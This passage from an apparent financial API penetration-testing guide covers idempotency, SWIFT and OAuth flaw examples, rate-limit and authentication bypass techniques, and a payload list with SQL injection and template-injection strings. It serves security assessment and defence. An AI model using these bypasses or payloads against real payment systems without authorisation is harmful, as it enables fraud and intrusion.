        (count/length) * math.log2(count/length)
        for count in counter.values()
    )
    return entropy * length  # Shannon entropy

# Test various API key formats
keys = [
    'sk_live_abcdefghijklmnop',  # Low entropy
    'sk_live_a1b2c3d4e5f6g7h8',  # Medium entropy
]
for key in keys:
    ent = calculate_entropy(key)
    print(f'Key: {key[:10]}... Entropy: {ent:.1f} bits')
"
```

### Compliance Validation Commands

```bash
# PCI DSS API compliance quick check
python -c "
import requests, json

def pci_api_check(base_url, token):
    headers = {'Authorization': f'Bearer {token}'}
    checks = []

    # Check TLS
    resp = requests.get(base_url, verify=True, timeout=10)
    checks.append(('TLS', resp.url.startswith('https://')))

    # Check HSTS
    hsts = resp.headers.get('Strict-Transport-Security')
    checks.append(('HSTS', hsts is not None))

    # Check for PAN in response
    import re
    pan_pattern = re.compile(r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b')
    pan_found = pan_pattern.search(resp.text)
    checks.append(('No PAN in response', pan_found is None))

    for name, passed in checks:
        status = 'PASS' if passed else 'FAIL'
        print(f'  [{status}] {name}')

pci_api_check('https://api.sandbox.bank.com', 'test_token')
"
```

---

## Real-World Examples

### Example 1: Idempotency Key Predictability Leading to Double-Spend

**Scenario**: A payment API used sequential integer idempotency keys.

**Discovery**:
```python
# Observed idempotency keys in intercepted requests
keys_observed = ['idk_1001', 'idk_1002', 'idk_1003']

# Attacker predicts next key and pre-submits payment
# First submission: legitimate $100 payment -> processed
# Second submission (same key): $1000 payment -> ALSO processed
# because server stored response for key but amount was different
```

**Root Cause**: Server validated idempotency key existence but not request body equality.

**Impact**: Double-spend vulnerability allowing repeated charge processing.

**Fix**: Server must hash (key + request body) as the idempotency lookup, and reject requests with same key but different body.

### Example 2: SWIFT Message Reference Manipulation

**Scenario**: An API that translated between MT103 (legacy) and pacs.008 (ISO 20022) formats.

**Discovery**:
```
Original MT103:
:20: Transaction Reference Number ABC123
:32B: Amount USD100,000.00
:59: Beneficiary /Account/DE89370400440532013000

Modified in transit:
:20: Transaction Reference Number ABC124  <-- Changed
:32B: Amount USD100,000.00
:59: Beneficiary /Account/DE89370400440532013000

The API accepted the modified reference without re-validation
```

**Root Cause**: No cryptographic binding between translation request and response.

**Impact**: Transaction reference tampering enabling reconciliation fraud.

### Example 3: OAuth Token Scope Bypass via FAPI Implementation Flaw

**Scenario**: A PSD2 Open Banking API claimed FAPI compliance.

**Discovery**:
```
# Normal token request
POST /oauth/token
{
  "grant_type": "authorization_code",
  "code": "legitimate_code",
  "redirect_uri": "https://client.app/callback",
  "client_id": "client_123",
  "code_verifier": "correct_verifier"
}

# Token response included: "scope": "accounts:read"

# Attacker modified the authorization request to include:
# scope=accounts:read+payments:write

# Server accepted the scope in token response even though
# it wasn't in the original authorization grant
```

**Root Cause**: Token endpoint didn't validate requested scope against authorized scope.

**Impact**: Unauthorized payment initiation violating PSD2 SCA requirements.

---

## Bypass Techniques

### Rate Limit Bypass in Financial APIs

```
Technique 1: Header-Based Rate Limit Bypass
+------------------------------------------------------------------+
| Original request:                                                 |
|   POST /api/v1/payments                                          |
|   X-Forwarded-For: 10.0.0.1                                      |
|                                                                    |
| Bypass:                                                           |
|   POST /api/v1/payments                                          |
|   X-Forwarded-For: 10.0.0.2  (increment IP)                     |
|   X-Real-IP: 10.0.0.3                                           |
|   X-Originating-IP: 10.0.0.4                                    |
|                                                                    |
| Note: Financial APIs MUST use authenticated identity for         |
| rate limiting, not IP address.                                   |
+------------------------------------------------------------------+

Technique 2: Method-Based Bypass
+------------------------------------------------------------------+
| If rate limit is per-method:                                      |
|   POST /api/v1/transfer -> rate limited                          |
|   PUT /api/v1/transfer  -> different limit?                      |
|   PATCH /api/v1/transfer -> different limit?                     |
+------------------------------------------------------------------+

Technique 3: Case Sensitivity
+------------------------------------------------------------------+
|   POST /api/v1/Payments -> different endpoint?                   |
|   POST /API/v1/payments -> different endpoint?                   |
+------------------------------------------------------------------+
```

### Authentication Bypass Patterns

```
Pattern 1: FAPI Non-Repudiation Bypass
+------------------------------------------------------------------+
| FAPI requires: JWT signed with PS256 or ES256                    |
| Test: Send request with RS256-signed token                       |
| If server accepts RS256, non-repudiation is weakened             |
+------------------------------------------------------------------+

Pattern 2: Token Refresh Race Condition
+------------------------------------------------------------------+
| 1. Request new token (get token_A with refresh_A)                |
| 2. Immediately request another new token                         |
|    (get token_B with refresh_B)                                  |
| 3. Use refresh_A to get token_C                                  |
| 4. Check if token_B is still valid                               |
| 5. If both valid -> token reuse vulnerability                    |
+------------------------------------------------------------------+

Pattern 3: Client Certificate Bypass
+------------------------------------------------------------------+
| 1. Extract client_id from certificate CN                         |
| 2. Test with different client_id in request body                 |
| 3. If server uses body client_id -> impersonation possible        |
+------------------------------------------------------------------+
```

---

## Common Pitfalls

### 1. Treating Financial APIs Like Standard REST APIs

```python
# WRONG: Standard API testing approach
def test_finance_api_wrong(endpoint):
    # Missing: idempotency, amount validation, currency checks
    requests.post(endpoint, json={'amount': 100})

# RIGHT: Finance-aware testing
def test_finance_api_right(endpoint):
    # Include proper headers and validation
    data = {
        'amount': '100.00',  # String, not float (precision)
        'currency': 'USD',   # ISO 4217
        'idempotency_key': str(uuid.uuid4()),
        'reference': 'test_reference_001'
    }
    headers = {
        'Idempotency-Key': data['idempotency_key'],
        'X-Request-ID': str(uuid.uuid4()),
        'X-Idempotent': 'true'
    }
    resp = requests.post(endpoint, json=data, headers=headers)
```

### 2. Ignoring Regulatory Implications

| Finding | Technical Severity | Regulatory Impact |
|---------|-------------------|-------------------|
| PAN in API response | CRITICAL | PCI DSS non-compliance, fines up to $100K/month |
| Missing audit logs | HIGH | SOX non-compliance, potential criminal liability |
| Weak TLS cipher | MEDIUM | PCI DSS Req 4.2.1 violation, compliance failure |
| No rate limiting | HIGH | PCI DSS Req 6.5.10, potential fraud vector |
| Missing idempotency | CRITICAL | Financial loss, regulatory complaint |

### 3. Not Testing in Sandbox First

```
ALWAYS test against sandbox/staging environments:
+------------------------------------------------------------------+
| Production: https://api.bank.com                                 |
| Sandbox:   https://api.sandbox.bank.com                          |
| Test:      https://api.test.bank.com                              |
|                                                                    |
| Never test against production without explicit written permission |
| Financial production testing can cause:                           |
|   - Actual money movement                                         |
|   - Regulatory violations                                         |
|   - Service disruption                                            |
|   - Criminal liability                                            |
+------------------------------------------------------------------+
```

---

## Reporting Template

```markdown
# Financial API Security Assessment Report

## Executive Summary
- **Target**: [API Name and Version]
- **Assessment Date**: [Date]
- **Scope**: [Endpoints Tested]
- **Environment**: [Sandbox/Production]
- **Methodology**: OWASP API Security Top 10 + PCI DSS 4.0

## Findings Summary
| # | Finding | Severity | PCI Req | CVSS | Status |
|---|---------|----------|---------|------|--------|
| 1 | [Finding] | CRITICAL | Req X.X | 9.1 | Open |
| 2 | [Finding] | HIGH | Req X.X | 7.5 | Open |

## Detailed Findings

### Finding 1: [Title]
- **PCI DSS Requirement**: Req X.X.X
- **Endpoint**: [METHOD /path]
- **Description**: [Technical description]
- **Impact**: [Financial/Regulatory impact]
- **Evidence**: [Request/Response with sanitized data]
- **Recommendation**: [Specific remediation]
- **Priority**: Immediate / High / Medium / Low

## Compliance Status
| PCI DSS Requirement | Status | Notes |
|---------------------|--------|-------|
| Req 3: Protect stored data | PASS/FAIL | [Details] |
| Req 4: Encrypt transmission | PASS/FAIL | [Details] |
| Req 6: Secure development | PASS/FAIL | [Details] |

## Appendices
A. API Endpoints Tested
B. Request/Response Samples (Sanitized)
C. Tool Output Summary
D. References (PCI DSS 4.0, OWASP API Top 10)
```

---

## Quick Reference

### Critical Endpoints to Test

```
Payment Endpoints:
  POST /api/v1/payments          # Create payment
  POST /api/v1/payments/{id}/void # Void payment
  POST /api/v1/payments/{id}/refund # Refund
  GET  /api/v1/payments/{id}     # Get payment

Account Endpoints:
  GET  /api/v1/accounts          # List accounts
  GET  /api/v1/accounts/{id}     # Get account
  GET  /api/v1/accounts/{id}/balance # Balance

Token Endpoints:
  POST /oauth/token              # Get token
  POST /oauth/revoke             # Revoke token
  POST /oauth/introspect         # Introspect token

Admin Endpoints:
  POST /api/v1/admin/users       # User management
  GET  /api/v1/admin/audit       # Audit logs
  POST /api/v1/admin/config      # Configuration
```

### Key Payloads

```python
# Amount manipulation test cases
amount_tests = [
    '100.00',      # Normal
    '-100.00',     # Negative
    '0.00',        # Zero
    '999999999999.99',  # Overflow
    '100.005',     # Precision
    "100' OR '1'='1",  # SQLi
    '{{7*7}}',     # SSTI
    '1e100',       # Scientific notation
]
```

### Severity Decision Matrix

| Finding | PCI Impact | Financial Impact | Severity |
|---------|------------|------------------|----------|
| PAN exposure in API | Req 3.3 violation | Data breach, fines | CRITICAL |
| alg=none JWT accepted | Req 8.3 violation | Auth bypass | CRITICAL |
| Double-spend possible | Req 6.5.10 | Direct financial loss | CRITICAL |
| Missing rate limits | Req 6.5.10 | Account takeover | HIGH |
| Weak TLS configuration | Req 4.2.1 | Data interception | HIGH |
| Information leakage | Req 6.5.5 | Reconnaissance aid | MEDIUM |

### References

- PCI DSS 4.0: https://www.pcisecuritystandards.org/document_library/
- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
- FAPI Security Profile: https://openid.net/specs/fapi/
- ISO 20022: https://www.iso20022.org/
- SWIFT CSP: https://www.swift.com/our-users/customer-security-programme
- PSD2 RTS SCA: https://www.eba.europa.eu/regulation-and-policy/payment-services-and-electronic-money/regulatory-technical-standards-on-strong-customer-authentication-and-common-and-secure-communication
